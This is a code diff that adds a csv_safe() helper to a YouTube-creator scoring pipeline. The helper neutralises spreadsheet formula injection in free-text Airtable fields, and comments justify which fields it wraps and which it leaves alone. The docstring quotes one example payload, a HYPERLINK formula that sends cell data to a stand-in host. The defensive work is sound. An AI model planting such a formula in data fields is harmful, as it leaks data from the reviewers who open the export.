@@ -343,6 +343,58 @@ def push_until_full(
     return counts
 
 
+# --- Spreadsheet safety for reviewer-facing text -------------------------
+# Characters that make a spreadsheet treat a cell's contents as a FORMULA
+# rather than as text. The tab and CR are in here because a leading
+# whitespace character is stripped by some importers before the formula
+# check runs, which puts the "=" back at the front.
+SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value: str) -> str:
+    """
+    Neutralise a value that a spreadsheet would otherwise run as a formula.
+
+    WHY this exists at all — it looks like a pointless prefix until you
+    follow the value to where a human actually reads it:
+
+      - Airtable is NOT a formula-eval context for these values, so nothing
+        executes when the record is pushed. That is why this is easy to
+        mistake for dead code and "clean up". Don't.
+      - But this pipeline's entire purpose is to hand rows to a HUMAN
+        reviewer, and the normal thing a reviewer does with an Airtable view
+        is export it to CSV and open it in Excel or Google Sheets. THAT is a
+        formula-eval context: a cell starting with =, +, -, @ or a leading
+        tab/CR is parsed as a formula, not as text.
+      - Two of the fields we write are attacker-influenced. "Channel Name"
+        is whatever the channel owner typed, and "Email" can come out of
+        browser_email.py, which reads arbitrary third-party websites. A
+        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
+        a live payload in the reviewer's spreadsheet — classic CSV (formula)
+        injection, and the reviewer's machine is the target, not ours.
+
+    A leading apostrophe is the fix because it is what spreadsheets
+    themselves use to mean "this cell is literal text": Excel and Sheets
+    both consume it on import and display the original string.
+
+    Deliberately conservative about what it touches:
+
+      - Only the FIRST character is examined. "Bob's Home Theater" and
+        `a-b@c.com` contain dangerous characters but cannot start a formula,
+        and mangling ordinary channel names/addresses would make the field
+        wrong for every honest candidate to defend against a rare one.
+      - Non-strings (and empty strings/None) pass straight through with
+        their type intact. Several record fields are genuinely numeric and
+        Airtable's Number fields reject strings, so stringifying here would
+        break the push for every record.
+    """
+    if not isinstance(value, str) or not value:
+        return value
+    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
+        return "'" + value
+    return value
+
+
 def process_candidate(
     candidate: dict,
     external_handles: dict[str, str],
@@ -451,10 +503,26 @@ def process_candidate(
             logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
             return None, "blocked"
 
+    # csv_safe() is applied to the FREE-TEXT fields only — see its docstring
+    # for why (the reviewer exports this view to CSV and opens it in Excel).
+    # Which fields are excluded, and why, matters as much as which are
+    # wrapped; each exclusion is noted at its line below.
     record = {
-        "Channel Name": stats["channel_title"],
+        # Attacker-controlled: whatever the channel owner typed.
+        "Channel Name": csv_safe(stats["channel_title"]),
+        # NOT wrapped: "Channel URL" and "Channel ID" are matched on EXACTLY
+        # elsewhere. Channel ID in particular is the dedupe key
+        # airtable_client.channel_exists() looks up by, so a leading
+        # apostrophe would make every existing row invisible to the lookup
+        # and the pipeline would re-POST duplicates instead of PATCHing.
+        # Neither field can carry a payload anyway: both are derived from a
+        # YouTube channel ID, which is a fixed-alphabet "UC..." string.
         "Channel URL": f"https://www.youtube.com/channel/{channel_id}",
         "Channel ID": channel_id,
+        # NOT wrapped: numeric fields. Airtable's Number fields reject
+        # strings, and csv_safe() passes non-strings through untouched
+        # precisely so that a mistake here fails loudly rather than being
+        # papered over.
         "Subscriber Count": stats["subscriber_count"],
         "Avg Views (last 10 videos)": round(performance["avg_views"], 1),
         "Engagement Rate": round(performance["avg_engagement_rate"], 2),
@@ -462,20 +530,41 @@ def process_candidate(
         # rejects raw JSON numbers, so this must be sent as a string.
         # Rounded to a whole number for display; the unrounded value is
         # still what feeds calc_overall_score above.
+        #
+        # NOT wrapped: this string is built here and always starts with a
+        # digit, so csv_safe() would be a guaranteed no-op. Harmless either
+        # way; left off so the wrapped fields are exactly the ones carrying
+        # third-party text.
         "Upload Frequency": f"{round(upload_freq)} videos/month",
         # Best-effort: most creators never set defaultAudioLanguage/
         # defaultLanguage on their videos, so this is frequently "Unknown".
         # Channel *country* (stats["country"]) is a separate signal and is
         # deliberately not used here, since it isn't the same thing as the
         # content's spoken language.
-        "Content Language": performance.get("content_language") or "Unknown",
-        "Email": email,
+        #
+        # Wrapped: it's a free-text field echoing a value the channel owner
+        # set on their videos.
+        "Content Language": csv_safe(performance.get("content_language") or "Unknown"),
+        # Attacker-influenced: chain step 4 (browser_email.py) reads
+        # arbitrary third-party websites for this.
+        "Email": csv_safe(email),
         "Fake Follower Risk Score": fake_risk,
         "Overall Score": overall_score,
+        # NOT wrapped: Single Select values that must match an existing
+        # Airtable option EXACTLY. push_record sends typecast=True, which
+        # silently CREATES a missing option rather than erroring — so a
+        # mangled "'Qualified" would quietly mint a new option and drop the
+        # row out of the reviewer's saved views. Both values are ours
+        # (scoring.py / config.py), not third-party text.
         "Qualification": qualification,
         "Status": DEFAULT_STATUS,
-        "Source": f"{SOURCE_LABEL} ({', '.join(candidate.get('matched_keywords', []))})",
+        # Wrapped for consistency rather than out of fear: the keywords are
+        # our own NICHES entries, so the risk is low, but it is still a text
+        # field assembled from data and there is no reason to leave the one
+        # free-text field uncovered.
+        "Source": csv_safe(f"{SOURCE_LABEL} ({', '.join(candidate.get('matched_keywords', []))})"),
         "Notes": "",
+        # NOT wrapped: a date value from prospect_day.today_iso(), not text.
         "Date Added": today_iso(),
     }
     return record, qualification
